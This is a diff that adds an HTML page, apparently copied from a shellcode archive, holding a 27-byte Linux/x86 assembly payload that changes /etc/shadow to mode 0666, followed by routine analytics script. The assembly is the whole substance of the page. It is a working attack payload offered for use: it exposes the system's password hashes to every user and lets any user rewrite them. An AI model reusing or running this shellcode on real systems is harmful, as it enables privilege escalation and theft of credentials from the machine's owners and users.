@@ -1,0 +1,36 @@
+<html idmmzcc-ext-docid="589930496"><head><title>Linux/x86 - chmod 666 /etc/shadow - 27 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Language" content="en">
+</head>
+
+
+<body><pre>; linux/x86 chmod 666 /etc/shadow 27 bytes
+; root@thegibson
+; 2010-01-15
+ 
+section .text
+        global _start
+ 
+_start:
+        ; chmod("//etc/shadow", 0666);
+        mov al, 15
+        cdq
+        push edx
+        push dword 0x776f6461
+        push dword 0x68732f63
+        push dword 0x74652f2f
+        mov ebx, esp
+        mov cx, 0666o
+        int 0x80
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script><script src="Linux_x86%20-%20chmod%20666%20_etc_shadow%20-%2027%20bytes_files/ga.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</pre></body></html>
